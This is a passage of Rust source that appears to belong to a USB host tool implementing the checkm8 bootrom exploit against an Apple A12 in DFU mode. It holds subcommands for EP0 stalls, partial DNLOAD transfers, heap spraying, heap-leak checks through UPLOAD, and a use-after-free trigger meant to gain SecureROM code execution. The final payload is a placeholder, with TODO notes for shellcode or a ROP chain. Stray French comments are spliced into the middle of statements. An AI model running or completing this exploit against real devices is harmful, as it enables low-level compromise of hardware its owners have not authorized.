        if let Some((_, state)) = dfu_getstatus(controller, slot_id) {
            output.push_str(&format!("  State: {}\n", state));
        } else {
            output.push_str("  Not responding\n");
        }
    }

    delay_mouse(100);

    // TEST 5: Multiple IN stalls in sequence
    output.push_str("\n[T5] Multiple IN stalls (×5):\n");
    reset_to_idle(controller, slot_id);
    for i in 0..5 {
        let cc = stall_ep0_in(controller, slot_id);
        let alive = is_device_connected(controller, port_number);
        output.push_str(&format!("  Stall #{}: cc={:?}, alive={}\n", i, cc, alive));
        if !alive {
            output.push_str("  Device disconnected!\n");
            break;
        }
    }
}

// ============================================================================
// Subcommand: partial — test partial data transfers
// ============================================================================

fn command_test_partial(output: &mut String, slot_id: u8, port_number: u8) {
    output.push_str("--- Test: Partial DATA Transfers ---\n\n");

    let mut controller = CONTROLLER.lock();
    let controller = // Correspondance de motifs — branchement exhaustif de Rust.
match controller.as_mut() {
        Some(c) => c,
        None => { output.push_str("ERROR: controller unavailable\n"); return; }
    };

    reset_to_idle(controller, slot_id);

    // Test DNLOAD wLength=0x800 but actual data = various sizes
    let sizes: &[usize] = &[0, 1, 64, 128, 512, 1024, 2047];

    for &actual_size in sizes {
        output.push_str(&format!("\n[wLength=0x800, actual={}B]:\n", actual_size));
        reset_to_idle(controller, slot_id);

        let data = alloc::vec![0xBB_u8; actual_size];
        let cc = setup_partial_data(
            controller, slot_id,
            DFU_OUT, DFU_DNLOAD, 0, 0,
            0x800,  // wLength — what device expects
            &data,  // actual — what we send
        );
        output.push_str(&format!("  Completion: {:?} ({})\n",
            cc, cc.map(cc_name).unwrap_or("timeout")));

        delay_mouse(50);
        let alive = is_device_connected(controller, port_number);
        output.push_str(&format!("  Connected: {}\n", alive));

        if alive {
            if let Some((_, state)) = dfu_getstatus(controller, slot_id) {
                output.push_str(&format!("  State: {}\n", state));
            }
        } else {
            output.push_str("  Device disconnected! Waiting...\n");
            // Wait for device to return
            for wait in 0..60 {
                delay_mouse(1000);
                if is_device_connected(controller, port_number) {
                    output.push_str(&format!("  Reconnected after {}s\n", wait + 1));
                    break;
                }
            }
        }
    }
}

// ============================================================================
// Subcommand: uaf — test Use-After-Free with stall + spray
// ============================================================================

fn command_test_uaf(output: &mut String, slot_id: u8, port_number: u8) {
    output.push_str("--- Test: UAF with EP0 Stall ---\n");
    output.push_str("Sequence: stall → DNLOAD → ABORT → spray → trigger\n\n");

    let mut controller = CONTROLLER.lock();
    let controller = // Correspondance de motifs — branchement exhaustif de Rust.
match controller.as_mut() {
        Some(c) => c,
        None => { output.push_str("ERROR: controller unavailable\n"); return; }
    };

    // Flow A: Original checkm8 sequence with real stalls
    for leak_rounds in &[1u32, 5, 10] {
        output.push_str(&format!("\n[Flow A: {} leak rounds]\n", leak_rounds));
        reset_to_idle(controller, slot_id);

        // Step 1: IN stall
        let stall_cc = stall_ep0_in(controller, slot_id);
        output.push_str(&format!("  1. IN stall: cc={:?}\n", stall_cc));
        if !is_device_connected(controller, port_number) {
            output.push_str("  CRASHED at stall\n");
            continue;
        }

        // Step 2: leak rounds — DNLOAD(0x800) + GETSTATUS
        let mut leaked = 0u32;
        for i in 0..*leak_rounds {
            let dnload_data = [0u8; 0x800];
            let dn = dfu_dnload(controller, slot_id, &dnload_data);
            if !is_device_connected(controller, port_number) {
                output.push_str(&format!("  2. CRASHED at leak round {}\n", i));
                break;
            }
            dfu_getstatus(controller, slot_id);
            if !is_device_connected(controller, port_number) {
                output.push_str(&format!("  2. CRASHED at getstatus round {}\n", i));
                break;
            }
            leaked += 1;
        }
        output.push_str(&format!("  2. Leaked {}/{} rounds\n", leaked, leak_rounds));

        if !is_device_connected(controller, port_number) { continue; }

        // Step 3: USB port reset
        output.push_str("  3. USB port reset...\n");
        let reset_ok = port_reset(controller, port_number);
        output.push_str(&format!("     Reset: {}\n", if reset_ok { "OK" } else { "FAILED" }));
        delay_mouse(500);

        if !is_device_connected(controller, port_number) {
            output.push_str("  Device gone after reset\n");
            continue;
        }

        // Step 4: Check state
        if let Some((_, state)) = dfu_getstatus(controller, slot_id) {
            output.push_str(&format!("  4. State after reset: {}\n", state));
        } else {
            output.push_str("  4. GETSTATUS failed\n");
        }

        // Step 5: Spray — GETSTATUS ×128 to fill heap
        output.push_str("  5. Spraying (GETSTATUS ×128)...\n");
        for _ in 0..128 {
            dfu_getstatus(controller, slot_id);
        }

        // Step 6: UPLOAD — check for leaked heap data
        let mut up_buffer = [0u8; 0x800];
        if let Some(up_length) = dfu_upload(controller, slot_id, &mut up_buffer) {
            let nonzero = up_buffer.iter().take(up_length as usize).any(|&b| b != 0);
            output.push_str(&format!("  6. UPLOAD: {}B, nonzero={}\n", up_length, nonzero));
            if nonzero {
                output.push_str("  *** HEAP DATA LEAKED! ***\n");
                output.push_str("  First 64 bytes: ");
                for b in up_buffer.iter().take(64) {
                    output.push_str(&format!("{:02x}", b));
                }
                output.push('\n');
            }
        } else {
            output.push_str("  6. UPLOAD failed\n");
        }

        // Step 7: Trigger — DNLOAD+ABORT+DNLOAD (UAF)
        output.push_str("  7. Trigger: DNLOAD→ABORT→DNLOAD...\n");
        reset_to_idle(controller, slot_id);
        let _ = dfu_dnload(controller, slot_id, &[0xAA; 0x800]);
        dfu_abort(controller, slot_id);

        if !is_device_connected(controller, port_number) {
            output.push_str("  CRASHED at abort (io_buffer freed)\n");
            continue;
        }

        // Second DNLOAD — writes to freed memory
        let result = dfu_dnload(controller, slot_id, &[0x55; 0x800]);
        if is_device_connected(controller, port_number) {
            output.push_str("  *** UAF SURVIVED! Device still alive! ***\n");
        } else {
            output.push_str("  UAF triggered crash (expected on A12)\n");
        }
    }

    // Flow B: stall → partial data → abort → spray
    output.push_str("\n\n[Flow B: Stall + Partial Data + Abort]\n");
    // Wait for device reconnection if needed
    for _ in 0..30 {
        if is_device_connected(controller, port_number) { break; }
        delay_mouse(1000);
    }
    if !is_device_connected(controller, port_number) {
        output.push_str("  Device not reconnected after 30s\n");
        return;
    }

    reset_to_idle(controller, slot_id);

    // Stall EP0 IN
    let stall = stall_ep0_in(controller, slot_id);
    output.push_str(&format!("  1. IN stall: cc={:?}\n", stall));

    // SETUP-only DNLOAD (wLength=0x800 but no DATA)
    let cc = setup_only(controller, slot_id, DFU_OUT, DFU_DNLOAD, 0, 0, 0x800);
    output.push_str(&format!("  2. Setup-only DNLOAD: cc={:?}\n", cc));

    // Port reset (microsecond precision)
    let reset_ok = port_reset(controller, port_number);
    output.push_str(&format!("  3. Port reset: {}\n", if reset_ok { "OK" } else { "FAIL" }));
    delay_mouse(500);

    if is_device_connected(controller, port_number) {
        if let Some((_, state)) = dfu_getstatus(controller, slot_id) {
            output.push_str(&format!("  4. State: {}\n", state));
        }
    } else {
        output.push_str("  Device gone\n");
    }
}

// ============================================================================
// Subcommand: exploit — full checkm8 sequence
// ============================================================================

fn command_full_exploit(output: &mut String, slot_id: u8, port_number: u8) {
    output.push_str("--- Full checkm8 Exploit Sequence ---\n");
    output.push_str("⚠  This will attempt code execution on the A12 SecureROM.\n\n");

    let mut controller = CONTROLLER.lock();
    let controller = // Correspondance de motifs — branchement exhaustif de Rust.
match controller.as_mut() {
        Some(c) => c,
        None => { output.push_str("ERROR: controller unavailable\n"); return; }
    };

    // Phase 1: Verify DFU state
    output.push_str("[Phase 1] Verify DFU state\n");
    if !reset_to_idle(controller, slot_id) {
        output.push_str("  FAILED: Cannot reach dfuIDLE\n");
        return;
    }
    output.push_str("  OK: dfuIDLE\n");

    // Phase 2: Create EP0 IN stall (accumulate requests)
    output.push_str("\n[Phase 2] Stall EP0_IN (request accumulation)\n");

    // Multiple IN stalls to accumulate io_requests on the device
    let mut stall_count = 0;
    for i in 0..6 {
        let cc = stall_ep0_in(controller, slot_id);
        if !is_device_connected(controller, port_number) {
            output.push_str(&format!("  CRASHED at stall #{}\n", i));
            break;
        }
        stall_count += 1;
        output.push_str(&format!("  Stall #{}: cc={:?}\n", i, cc));
    }
    output.push_str(&format!("  Created {} stalls\n", stall_count));

    // Phase 3: DNLOAD to set up io_buffer pointer
    output.push_str("\n[Phase 3] DNLOAD to set ep0DataPhaseBuffer\n");
    let dnload_data = [0u8; 0x800];
    let cc = dfu_dnload(controller, slot_id, &dnload_data);
    output.push_str(&format!("  DNLOAD: {:?}\n", cc));

    if !is_device_connected(controller, port_number) {
        output.push_str("  CRASHED at DNLOAD\n");
        return;
    }

    // Phase 4: Setup-only DNLOAD with wLength mismatch
    output.push_str("\n[Phase 4] Setup-only incomplete DNLOAD\n");
    let cc = setup_only(controller, slot_id, DFU_OUT, DFU_DNLOAD, 0, 0, 0x800);
    output.push_str(&format!("  Setup-only: cc={:?}\n", cc));

    // Phase 5: USB port reset — triggers abort → free(io_buffer)
    output.push_str("\n[Phase 5] USB port reset (free io_buffer)\n");
    let reset_ok = port_reset(controller, port_number);
    output.push_str(&format!("  Reset: {}\n", if reset_ok { "OK" } else { "FAIL" }));
    delay_mouse(500);

    if !is_device_connected(controller, port_number) {
        output.push_str("  Device left DFU after reset\n");
        return;
    }

    // Phase 6: Heap spray
    output.push_str("\n[Phase 6] Heap spray via GETSTATUS\n");
    let mut spray_ok = 0;
    for _ in 0..128 {
        if dfu_getstatus(controller, slot_id).is_some() {
            spray_ok += 1;
        }
    }
    output.push_str(&format!("  GETSTATUS success: {}/128\n", spray_ok));

    // Phase 7: UPLOAD — check for heap leak
    output.push_str("\n[Phase 7] UPLOAD — heap data leak check\n");
    let mut up_buffer = [0u8; 0x800];
    if let Some(up_length) = dfu_upload(controller, slot_id, &mut up_buffer) {
        let nonzero = up_buffer.iter().take(up_length as usize).any(|&b| b != 0);
        output.push_str(&format!("  UPLOAD: {}B, nonzero={}\n", up_length, nonzero));
        if nonzero {
            output.push_str("  *** HEAP DATA LEAKED ***\n  ");
            for b in up_buffer.iter().take(128) {
                output.push_str(&format!("{:02x}", b));
            }
            output.push('\n');
        }
    } else {
        output.push_str("  UPLOAD failed\n");
    }

    // Phase 8: Trigger UAF
    output.push_str("\n[Phase 8] Trigger UAF (DNLOAD to freed io_buffer)\n");
    reset_to_idle(controller, slot_id);
    let _ = dfu_dnload(controller, slot_id, &[0xAA; 0x800]);
    dfu_abort(controller, slot_id);

    if is_device_connected(controller, port_number) {
        // io_buffer freed, now write controlled payload
        // TODO: Replace with real payload (overwrite_value, shellcode, ROP chain)
        let payload = [0x41u8; 0x800]; // Placeholder
        let result = dfu_dnload(controller, slot_id, &payload);
        if is_device_connected(controller, port_number) {
            output.push_str("  *** UAF WRITE SURVIVED — EXPLOITATION IN PROGRESS ***\n");
            // TODO: execute payload via second USB request
        } else {
            output.push_str("  UAF triggered crash (expected — A12 double-abort)\n");
        }
    } else {
        output.push_str("  Device crashed at ABORT\n");
    }

    output.push_str("\n--- Exploit sequence complete ---\n");
}
